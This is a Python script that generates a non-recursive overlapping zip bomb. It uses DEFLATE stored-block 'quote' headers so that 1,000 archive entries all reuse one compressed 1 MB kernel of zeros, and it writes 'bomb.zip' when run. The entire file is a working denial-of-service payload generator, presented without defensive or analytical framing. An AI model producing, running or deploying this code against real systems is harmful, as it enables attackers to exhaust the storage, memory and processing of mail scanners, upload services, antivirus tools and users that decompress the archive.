import zlib
import struct

def make_quote_header(length):
    """
    Creates a DEFLATE non-compressed block header.
    It instructs the decompressor to treat the next `length` bytes as raw, uncompressed data.
    """
    nlen = (~length) & 0xFFFF
    return struct.pack('<BHH', 0x00, length, nlen)

def make_lfh(filename, crc, comp_size, uncomp_size):
    """Generates a ZIP Local File Header (LFH)"""
    fname = filename.encode('utf-8')
    header = struct.pack('<IHHHHHIIIHH',
        0x04034b50,  # Signature
        20, 0, 8,    # Version, Flags, Compression Method (8 = Deflate)
        0, 0,        # Mod Time, Mod Date
        crc, comp_size, uncomp_size,
        len(fname), 0 # Filename len, Extra field len
    )
    return header + fname

def make_cdh(filename, crc, comp_size, uncomp_size, offset):
    """Generates a ZIP Central Directory Header (CDH)"""
    fname = filename.encode('utf-8')
    header = struct.pack('<IHHHHHHIIIHHHHHII',
        0x02014b50,      # Signature
        20, 20, 0, 8,    # Version made, Version needed, Flags, Method
        0, 0,            # Mod Time, Mod Date
        crc, comp_size, uncomp_size,
        len(fname), 0, 0, 0, 0, 0,
        offset           # Offset of LFH
    )
    return header + fname

def make_eocd(num_entries, cd_size, cd_offset):
    """Generates the End of Central Directory (EOCD) record"""
    header = struct.pack('<IHHHHIIH',
        0x06054b50,   # Signature
        0, 0,         # Disk numbers
        num_entries, num_entries,
        cd_size, cd_offset,
        0             # Comment length
    )
    return header

def generate_zip_bomb(filename="bomb.zip", num_files=1000, kernel_size=1024*1024):
    print(f"Generating non-recursive zip bomb '{filename}'...")
    
    # 1. Generate the highly compressed kernel (1 MB of zeros)
    kernel_uncomp = b"\x00" * kernel_size
    # wbits=-15 forces raw DEFLATE stream without zlib headers
    zobj = zlib.compressobj(level=9, wbits=-15)
    kernel_comp = zobj.compress(kernel_uncomp) + zobj.flush()

    file_props = {}
    current_comp_size = len(kernel_comp)
    current_uncomp_size = len(kernel_uncomp)
    prefix_uncomp = b""

    # 2. Iterate backwards to calculate properties and quote blocks
    for i in range(num_files, 0, -1):
        fname = f"{i}.txt"
        
        # The uncompressed data for this file is all subsequent LFHs + the uncompressed kernel
        crc = zlib.crc32(prefix_uncomp + kernel_uncomp) & 0xFFFFFFFF
        
        lfh = make_lfh(fname, crc, current_comp_size, current_uncomp_size)
        
        file_props[i] = {
            'filename': fname,
            'crc': crc,
            'comp_size': current_comp_size,
            'uncomp_size': current_uncomp_size,
            'lfh': lfh
        }
        
        # Prepare sizes and uncompressed prefix for the (i-1) iteration
        prefix_uncomp = lfh + prefix_uncomp
        current_comp_size += 5 + len(lfh) # 5 bytes for Quote Header + LFH size
        current_uncomp_size += len(lfh)

    # 3. Assemble the overlapping ZIP file
    with open(filename, "wb") as f:
        current_offset = 0
        
        # Write all LFHs and intercalate DEFLATE Quote Headers
        for i in range(1, num_files + 1):
            lfh = file_props[i]['lfh']
            file_props[i]['offset'] = current_offset
            
            f.write(lfh)
            current_offset += len(lfh)
            
            # If not the last file, insert a quote header for the *next* LFH
            if i < num_files:
                next_lfh_len = len(file_props[i+1]['lfh'])
                quote = make_quote_header(next_lfh_len)
                f.write(quote)
                current_offset += len(quote)
                
        # Write the compressed kernel payload once
        f.write(kernel_comp)
        current_offset += len(kernel_comp)
        
        # Append the Central Directory Headers
        cd_start_offset = current_offset
        for i in range(1, num_files + 1):
            props = file_props[i]
            cdh = make_cdh(
                props['filename'], props['crc'], 
                props['comp_size'], props['uncomp_size'], props['offset']
            )
            f.write(cdh)
            current_offset += len(cdh)
            
        cd_size = current_offset - cd_start_offset
        
        # Cap it off with the EOCD
        f.write(make_eocd(num_files, cd_size, cd_start_offset))
        
    print(f"Done! {num_files} overlapping files linked to a {kernel_size//1024} KB core.")

if __name__ == "__main__":
    generate_zip_bomb()